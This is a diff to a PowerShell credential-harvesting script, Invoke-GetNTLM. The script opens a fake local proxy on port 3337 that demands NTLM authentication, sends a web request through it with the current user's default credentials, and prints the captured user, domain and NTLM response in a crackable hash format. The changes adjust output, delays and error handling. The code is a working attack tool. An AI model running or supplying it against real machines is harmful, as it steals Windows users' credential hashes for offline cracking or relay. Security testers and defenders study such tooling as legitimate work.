@@ -160,8 +160,9 @@ function Invoke-GetNTLM {
                             [string]$String = "$($user)::$($domain):$($code):$($NTProofStr):$($NTLMresponse)"
                             $res = "HTTP/1.1 200 OK`r`nContent-Type: text/html`r`nContent-Length: " + $e2.length.tostring() + "`r`n`r`n" + $e2
                             $writer.write($res)
+                            $string | Write-Output
                             $writer.flush()
-                            return $string
+
                         }
                     } else {
                         $res = "HTTP/1.1 407 Proxy Authorization Required`r`nProxy-Authenticate: Negotiate`r`nProxy-Authenticate: NTLM`r`nContent-Type: text/html`r`nContent-Length: " + $e.length.tostring() + "`r`n`r`n" + $e
@@ -179,19 +180,20 @@ function Invoke-GetNTLM {
     }
 
     $listener.Stop()
+    
     }
 
     finally {$listener.Stop()}
 }
 
 $job = Start-Job -ScriptBlock $ScriptBlock
-Start-Sleep -Seconds 1
+Start-Sleep -Seconds 3
 
 $wc = New-Object System.Net.WebClient
 $WebProxy = New-Object System.Net.WebProxy("http://127.0.0.1:3337", $true)
 $WebProxy.UseDefaultCredentials = $true
 $wc.Proxy = $WebProxy
-$wc.DownloadString("http://www.google.com") | Out-Null
+try {$wc.DownloadString("http://www.google.com") | Out-Null} Catch {}
 
 $Output = Receive-Job -Job $job
 Write-Host $Output -ForegroundColor "Yellow"
